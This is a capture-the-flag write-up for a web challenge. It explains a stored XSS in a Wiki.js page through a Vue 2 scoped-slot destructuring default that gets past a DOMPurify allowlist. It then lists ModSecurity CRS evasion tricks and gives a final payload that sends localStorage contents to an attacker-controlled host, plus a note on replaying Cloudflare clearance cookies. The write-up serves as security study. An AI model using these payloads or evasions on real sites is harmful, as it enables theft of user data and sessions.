---
title: "Duck Wiki"
date: "2026-06-28"
author: "tungdlm99"
ctf: "V1t CTF 2026"
category: web
difficulty: hard
points: 0
flag_format: "v1t{...}"
tags: [ctf, v1t-ctf-2026, web, ai-assisted]
icon: "🦆"
draft: false
summary: "Stored XSS in a Wiki.js page via a Vue 2 scoped-slot destructuring-default SSTI primitive, smuggled past DOMPurify's <tabset> allowlist and a ModSecurity CRS proxy to exfiltrate localStorage.FLAG from the bot."
---

## Summary

A Wiki.js v2 instance lets you submit HTML that a Puppeteer bot renders while logged in, with the flag sitting in `localStorage.FLAG`. The bug is a Vue 2 client-side template injection: DOMPurify allowlists `<tabset>` and `v-slot` for a legit feature, and a scoped-slot destructuring default turns that into arbitrary JS, which then has to be rewritten construct-by-construct to score 0 against a ModSecurity CRS proxy.

## Solution

I went in reading this as a client-side template injection problem, not a classic reflected XSS one: Wiki.js mounts page content with the full Vue build (runtime compiler, `unsafe-eval`, no CSP), so the real question was which sanitizer-approved attribute Vue would still treat as code. I had the model triage the `html-security` config and it surfaced the giveaway: DOMPurify 2.4.3 with `ADD_TAGS: [tabset, template]` and `ADD_ATTR: [v-pre, v-slot:tabs, v-slot:content, target]`. The `v-pre` guard only neutralizes `{{ }}` in text nodes; it does nothing about `v-slot`.

My direction here was the key insight, and I had the model confirm the mechanics: `<tabset>` renders `<slot name="content">` and calls the scoped-slot function with `{}`, so a **destructuring default** in the slot binding executes. I caught one wrong turn early - the model first tried a single-param default, which never fires because props is always empty; it has to be object destructuring with a default, `function ({x = EVIL}) {}`, so the default expression runs.

That gave a clean primitive:

```html
<tabset><template v-slot:content="{x=EVIL}"></template></tabset>
```

The grind was the WAF. I put the CRS audit log on stdout and fed the matched rule IDs back to the model one round at a time, steering each rewrite while it produced the actual payloads: drop blocked call names (`fetch`/`eval`/`alert`) for an assignment via `new Image().src=`; swap `${}` interpolation for `+` concatenation; use backtick strings and a protocol-relative `//host` to dodge libinjection/SQL rules; and append a trailing param after `}` so the brace never sits next to a closing quote. Anomaly score hit 0.

The end-to-end payload - point `ATTACKER` at a listener you control (e.g. webhook.site), submit through the form, then read the captured path:

```html
<tabset><template v-slot:content="{x=new Image().src=`//ATTACKER/img/`+encodeURIComponent(localStorage.FLAG)},z"></template></tabset>
```

Submitting it: the CRS proxy passes the form fine, but Cloudflare's bot challenge sits in front of the remote, so I did it in a real browser (or replay with a valid `cf_clearance` cookie + matching UA). The bot logs in as the assistant account, builds the `bot/<slug>` page from this HTML, visits it, the slot default runs in its session, and the exfil GET lands on the listener with `/img/v1t{...}` in the path. I verified the captured request matched before calling it.

## Flag

```
v1t{sm4rty_w1k1_duck}
```
